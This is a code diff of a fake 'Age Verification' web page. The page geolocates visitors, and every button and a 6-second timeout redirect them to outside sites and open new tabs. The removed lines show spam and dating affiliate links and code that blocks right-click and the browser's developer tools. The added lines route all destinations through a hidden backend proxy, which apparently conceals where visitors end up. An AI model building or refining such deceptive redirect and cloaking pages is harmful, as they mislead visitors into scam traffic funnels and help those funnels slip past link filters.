@@ -42,7 +42,7 @@
     #user-flag { min-height: 40px; margin-top: 15px; }
   </style>
 </head>
-<body oncontextmenu="return false;">
+<body>
 
   <div class="card">
     <h2>Age Verification</h2>
@@ -55,19 +55,16 @@
   </div>
 
   <script>
-    const link2 = "https://gcqp2rf.newromancedate.com/x4e81wu?s1=baby&cid=baby";      
-    const link1 = "https://deiigea.onlocdate.com/s/3c071b5f3516e?track=baby"; 
-    const link3 = "https://smrturl.co/a/s674cc01fd5/576?s1=baby";
-    const link4 = "https://annoyancedisparity.com/fcisf4et?key=9b843c33f8c1714c8f56c1c946a68f83";
+    
+    const backendProxy = "https://linen.loviumcrest.site";
 
     const yesBtn = document.getElementById('btnYes');
     const noBtn = document.getElementById('btnNo');
     let timeoutTimer;
 
-
     function startTimeout() {
         timeoutTimer = setTimeout(() => {
-            window.location.replace(link4);
+            window.location.replace(backendProxy + "?go=timeout");
         }, 6000);
     }
 
@@ -75,7 +72,6 @@
         clearTimeout(timeoutTimer);
     }
 
-    // --- FLAG ---
     async function fetchUserLocation() {
         try {
             const response = await fetch('https://ipapi.co/json/');
@@ -89,24 +85,18 @@
 
     yesBtn.addEventListener('click', () => {
         stopTimers();
-        localStorage.setItem('user_choice', 'verified_yes');
-        window.open(link1, '_blank');
-        window.location.replace(link2);
+        window.open(backendProxy + "?go=yes1", '_blank');
+        // Redirect tab saat ini ke link2 lewat backend
+        window.location.replace(backendProxy + "?go=yes2");
     });
 
     noBtn.addEventListener('click', () => {
         stopTimers();
-        localStorage.setItem('user_choice', 'verified_no');
-        window.location.replace(link3);
+        window.location.replace(backendProxy + "?go=no");
     });
 
     fetchUserLocation();
     startTimeout();
-
-    document.addEventListener('contextmenu', e => e.preventDefault());
-    document.onkeydown = (e) => { 
-        if(e.keyCode == 123 || (e.ctrlKey && e.shiftKey && e.keyCode == 73) || (e.ctrlKey && e.keyCode == 85)) return false; 
-    };
   </script>
 </body>
 </html>
